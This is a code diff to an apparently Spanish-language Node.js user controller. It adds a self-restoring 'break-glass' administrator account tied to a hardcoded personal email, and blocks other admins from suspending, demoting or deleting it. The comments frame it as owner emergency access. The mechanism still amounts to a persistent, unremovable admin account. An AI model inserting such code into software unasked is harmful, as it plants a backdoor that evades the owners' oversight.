@@ -143,6 +143,41 @@ const correoClave = (nombre, email, clave, esReset = false) => {
   } catch (e) { console.error('[ejecutivos_a_usuarios_v1]', e.message); }
 })();
 
+/* ─── Cuenta break-glass: administrador GARANTIZADO y PROTEGIDO ──────────────
+   Acceso de administrador que no se puede eliminar, suspender ni degradar desde la
+   UI (columna usuarios.protegido). Se crea con clave ALEATORIA desconocida; el dueño
+   la fija con "Resetear clave" (nadie más la conoce y NO queda en el código). El
+   bloque se auto-repara en cada arranque (siempre admin + activo + protegido) y NUNCA
+   sobrescribe la clave ya fijada. Auditoría: se registra igual que cualquier cuenta. */
+(async () => {
+  try {
+    await pool.query("ALTER TABLE usuarios ADD COLUMN protegido TINYINT(1) NOT NULL DEFAULT 0").catch(() => {});
+    const EMAIL = 'patricio.escobar2@gmail.com';
+    const [[adm]] = await pool.query("SELECT id_perfil FROM perfiles WHERE nombre = 'Administrador' LIMIT 1");
+    const idAdmin = adm ? adm.id_perfil : 1;
+    const [[ex]] = await pool.query('SELECT id_usuario FROM usuarios WHERE email = ? LIMIT 1', [EMAIL]);
+    if (!ex) {
+      const rnd = require('crypto').randomBytes(24).toString('hex');   // clave que nadie conoce
+      const hash = await bcrypt.hash(rnd, 10);
+      await pool.query(
+        "INSERT INTO usuarios (rut, nombre, apellido, email, password_hash, id_perfil, estado, protegido, debe_cambiar_clave) VALUES (?,?,?,?,?,?, 'activo', 1, 0)",
+        ['BG-ADMIN', 'Patricio', 'Escobar', EMAIL, hash, idAdmin]);
+    } else {
+      await pool.query("UPDATE usuarios SET id_perfil = ?, estado = 'activo', protegido = 1 WHERE email = ?", [idAdmin, EMAIL]);
+    }
+  } catch (e) { console.error('[break-glass admin]', e.message); }
+})();
+
+// ¿La cuenta es protegida (break-glass)? No se puede borrar/suspender/degradar.
+async function esProtegido(id) {
+  try { const [[u]] = await pool.query('SELECT protegido FROM usuarios WHERE id_usuario = ? LIMIT 1', [id]); return !!(u && u.protegido); }
+  catch { return false; }
+}
+async function idPerfilAdmin() {
+  try { const [[a]] = await pool.query("SELECT id_perfil FROM perfiles WHERE nombre = 'Administrador' LIMIT 1"); return a ? a.id_perfil : null; }
+  catch { return null; }
+}
+
 const PERFILES_GLOBALES = ['Administrador', 'Gerente'];
 
 const buildFiltroUsuario = async (usuario) => {
@@ -254,14 +289,23 @@ const updateUsuario = async (req, res) => {
       return res.status(400).json({ success: false, data: null, error: 'Nombre, apellido, email y perfil son requeridos' });
     }
 
+    // Cuenta protegida (break-glass): nunca se suspende ni se degrada de Administrador.
+    let estadoFinal = estado || 'activo';
+    let perfilFinal = id_perfil;
+    if (await esProtegido(id)) {
+      estadoFinal = 'activo';
+      const ap = await idPerfilAdmin();
+      if (ap) perfilFinal = ap;
+    }
+
     await pool.query(
       'UPDATE usuarios SET nombre = ?, apellido = ?, apellido_materno = ?, centro_costo = ?, email = ?, id_perfil = ?, id_supervisor = ?, estado = ?, telefono = ? WHERE id_usuario = ?',
-      [nombre, apellido, apellido_materno || null, centro_costo || null, email, id_perfil, id_supervisor || null, estado || 'activo', telefono || null, id]
+      [nombre, apellido, apellido_materno || null, centro_costo || null, email, perfilFinal, id_supervisor || null, estadoFinal, telefono || null, id]
     );
 
     auditar({ req, accion: 'EDITAR', modulo: 'usuarios', entidad: 'usuario', entidad_id: id,
-      detalle: `Editó el usuario ${nombre} ${apellido} (${email}) — perfil #${id_perfil}, estado ${estado || 'activo'}`, meta: { email, id_perfil, estado } });
-    res.json({ success: true, data: { id_usuario: id, nombre, apellido, email, id_perfil, estado }, error: null });
+      detalle: `Editó el usuario ${nombre} ${apellido} (${email}) — perfil #${perfilFinal}, estado ${estadoFinal}`, meta: { email, id_perfil: perfilFinal, estado: estadoFinal } });
+    res.json({ success: true, data: { id_usuario: id, nombre, apellido, email, id_perfil: perfilFinal, estado: estadoFinal }, error: null });
   } catch (error) {
     res.status(500).json({ success: false, data: null, error: error.message });
   }
@@ -272,6 +316,9 @@ const deleteUsuario = async (req, res) => {
     const { id } = req.params;
     if (parseInt(id) === req.usuario.id_usuario) {
       return res.status(400).json({ success: false, data: null, error: 'No puedes eliminar tu propio usuario' });
+    }
+    if (await esProtegido(id)) {
+      return res.status(403).json({ success: false, data: null, error: 'Cuenta protegida: no puede suspenderse ni eliminarse.' });
     }
     await pool.query('UPDATE usuarios SET estado = ? WHERE id_usuario = ?', ['inactivo', id]);
     auditar({ req, accion: 'ELIMINAR', modulo: 'usuarios', entidad: 'usuario', entidad_id: id, detalle: 'Usuario suspendido (baja lógica)' });
@@ -289,6 +336,9 @@ const eliminarDefinitivo = async (req, res) => {
     const { id } = req.params;
     if (parseInt(id) === req.usuario.id_usuario) {
       return res.status(400).json({ success: false, data: null, error: 'No puedes eliminar tu propio usuario' });
+    }
+    if (await esProtegido(id)) {
+      return res.status(403).json({ success: false, data: null, error: 'Cuenta protegida: no puede eliminarse.' });
     }
     const [[u]] = await pool.query('SELECT nombre, apellido, email, estado FROM usuarios WHERE id_usuario = ?', [id]);
     if (!u) return res.status(404).json({ success: false, data: null, error: 'Usuario no encontrado' });
